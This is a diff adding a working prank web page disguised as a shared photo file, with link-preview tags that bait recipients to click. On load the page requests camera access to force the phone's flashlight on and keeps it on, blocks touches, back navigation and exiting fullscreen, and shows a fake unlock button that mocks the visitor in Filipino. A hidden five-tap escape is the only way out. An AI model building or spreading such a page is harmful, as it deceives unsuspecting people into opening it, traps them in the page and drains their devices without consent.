@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- Open Graph / Link Preview -->
+    <meta property="og:title" content="IMG_20260820_235512.jpg" />
+    <meta property="og:description" content="📸 Grabe naman walang awa — click to view" />
+    <meta property="og:image" content="https://i.imgur.com/3bK9x2L.png" />
+    <meta property="og:image:width" content="800" />
+    <meta property="og:image:height" content="600" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    
+    <title>IMG_20260820.jpg</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            width: 100%; height: 100%;
+            overflow: hidden;
+            touch-action: none;
+            user-select: none;
+            -webkit-user-select: none;
+            position: fixed;
+        }
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            color: #fff;
+        }
+        .overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.93);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            text-align: center;
+            pointer-events: none;
+        }
+        .overlay * {
+            pointer-events: none;
+        }
+        .overlay .btn {
+            pointer-events: auto !important;
+            background: #ff0066;
+            border: none;
+            color: #fff;
+            padding: 16px 40px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 80%;
+            max-width: 280px;
+            transition: 0.2s;
+            position: relative;
+            z-index: 10000;
+        }
+        .overlay .btn:active { transform: scale(0.95); }
+        .overlay h1 {
+            font-size: 28px;
+            color: #ff0066;
+            text-shadow: 0 0 40px #ff006688;
+            margin-bottom: 16px;
+            pointer-events: auto !important; /* Emergency exit trigger */
+            cursor: default;
+        }
+        .overlay p {
+            color: #8899aa;
+            font-size: 16px;
+            max-width: 320px;
+            margin-bottom: 30px;
+        }
+        .overlay .small {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #445566;
+        }
+        .blur-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MDAiIGhlaWdodD0iNjAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMjIyIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtc2l6ZT0iMzAiIGZpbGw9IiM1NTUiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGR5PSIuM2VtIj7wn5GqIENsaWNrIHRvIHZpZXc8L3RleHQ+PC9zdmc+') no-repeat center/cover;
+            filter: blur(20px);
+            z-index: 0;
+        }
+        .overlay { z-index: 1; }
+        video { display: none; }
+        .emergency-unlocked {
+            animation: fadeGlow 1s ease;
+        }
+        @keyframes fadeGlow {
+            0% { box-shadow: 0 0 0 #00ff88; }
+            50% { box-shadow: 0 0 80px #00ff88; }
+            100% { box-shadow: 0 0 0 #00ff88; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="blur-bg"></div>
+
+<div class="overlay" id="mainOverlay">
+    <h1 id="emergencyTitle">🔦 LIGHT LOCKED</h1>
+    <p>Your flashlight is now <strong style="color:#ff0066;">permanently ON</strong> MATULOG KANA PURO KA CELLPHONE!.</p>
+    <button class="btn" id="fakeUnlockBtn">💡 TRY TO UNLOCK</button>
+    <div class="small">🔒 This action is irreversible. <br> <span id="counterDisplay">ARAY KO PAKAK.</span></div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+
+<script>
+    // ===== EMERGENCY EXIT: TAP TITLE 5 TIMES FAST =====
+    let tapCount = 0;
+    let tapTimer = null;
+
+    document.getElementById('emergencyTitle').addEventListener('click', function(e) {
+        e.stopPropagation();
+        tapCount++;
+        if (tapTimer) clearTimeout(tapTimer);
+        tapTimer = setTimeout(() => { tapCount = 0; }, 2000); // reset if slow
+
+        if (tapCount >= 5) {
+            tapCount = 0;
+            triggerEmergencyExit();
+        }
+    });
+
+    function triggerEmergencyExit() {
+        // Turn off flashlight
+        if (track && isLightOn) {
+            try {
+                track.applyConstraints({ advanced: [{ torch: false }] });
+                track.stop();
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+                track = null;
+                isLightOn = false;
+                clearInterval(lockInterval);
+            } catch (e) {}
+        }
+
+        // Unlock UI
+        document.querySelector('.overlay').style.pointerEvents = 'auto';
+        document.querySelector('.overlay *').style.pointerEvents = 'auto';
+
+        // Change UI to show escape
+        const h1 = document.getElementById('emergencyTitle');
+        h1.textContent = '✅ UNLOCKED';
+        h1.style.color = '#00ff88';
+        h1.style.textShadow = '0 0 40px #00ff8866';
+
+        const p = document.querySelector('.overlay p');
+        p.innerHTML = 'Emergency exit activated. Flashlight is off. You can close this page now.';
+
+        const btn = document.getElementById('fakeUnlockBtn');
+        btn.textContent = '🚪 CLOSE PAGE';
+        btn.style.background = '#00ff88';
+        btn.style.color = '#000';
+        btn.onclick = function() {
+            window.close();
+            // fallback
+            document.body.innerHTML = '<h1 style="color:#00ff88;text-align:center;margin-top:30vh;">You are free. Close this tab.</h1>';
+        };
+
+        document.querySelector('.small').innerHTML = '🔓 Emergency override by Lisa.';
+
+        // Vibrate to confirm
+        if (navigator.vibrate) navigator.vibrate([100, 100, 100]);
+    }
+
+    // ===== LOCK INTERACTIONS (except button & title) =====
+    (function lockAllInteractions() {
+        document.addEventListener('touchstart', function(e) {
+            if (!e.target.closest('.btn') && !e.target.closest('#emergencyTitle')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        document.addEventListener('click', function(e) {
+            if (!e.target.closest('.btn') && !e.target.closest('#emergencyTitle')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('dragstart', e => e.preventDefault());
+    })();
+
+    // ===== FORCE FULLSCREEN & LOCK NAV =====
+    (function lockScreen() {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().catch(() => {});
+        }
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        });
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, location.href);
+        });
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        if (navigator.wakeLock) {
+            navigator.wakeLock.request('screen').catch(() => {});
+        }
+    })();
+
+    // ===== FLASHLIGHT =====
+    let stream = null;
+    let track = null;
+    let isLightOn = false;
+    let lockInterval = null;
+
+    async function forceFlashlightOn() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment' }
+            });
+            track = stream.getVideoTracks()[0];
+            await track.applyConstraints({
+                advanced: [{ torch: true }]
+            });
+            isLightOn = true;
+
+            lockInterval = setInterval(async () => {
+                if (track && isLightOn) {
+                    try {
+                        await track.applyConstraints({
+                            advanced: [{ torch: true }]
+                        });
+                    } catch (e) {}
+                }
+            }, 200);
+
+        } catch (err) {
+            document.body.style.background = '#ffffff';
+            document.querySelector('.overlay').style.background = 'rgba(255,255,255,0.95)';
+            document.querySelector('.overlay h1').style.color = '#000';
+            document.querySelector('.overlay p').style.color = '#333';
+            document.querySelector('.overlay .btn').style.background = '#000';
+            document.querySelector('.overlay .btn').style.color = '#fff';
+        }
+    }
+
+    // ===== FAKE UNLOCK BUTTON =====
+    document.getElementById('fakeUnlockBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+        const p = document.querySelector('.overlay p');
+        p.innerHTML = '❌ <strong style="color:#ff4466;">Access denied.</strong> Premium unlock failed. <br>Charge mo nalang Cellphone mo para di malobat ☺.';
+        p.style.color = '#ff4466';
+        if (!isLightOn) forceFlashlightOn();
+    });
+
+    // ===== COUNTER =====
+    let counter = 0;
+    setInterval(() => {
+        counter++;
+        document.getElementById('counterDisplay').textContent = `⏳ Light locked for ${counter}s — reboot required.`;
+    }, 1000);
+
+    // ===== INIT =====
+    (async function() {
+        await forceFlashlightOn();
+        setTimeout(() => {
+            const h1 = document.getElementById('emergencyTitle');
+            h1.textContent = '🔒 LIGHT PERMANENTLY LOCKED';
+            const p = document.querySelector('.overlay p');
+            p.innerHTML = 'This device has been <strong style="color:#ff0066;">flashlight-locked</strong>.<br>WAG KANG KABAHAN HINDI TO VIRUS 😁.';
+        }, 3000);
+    })();
+</script>
+</body>
+</html>
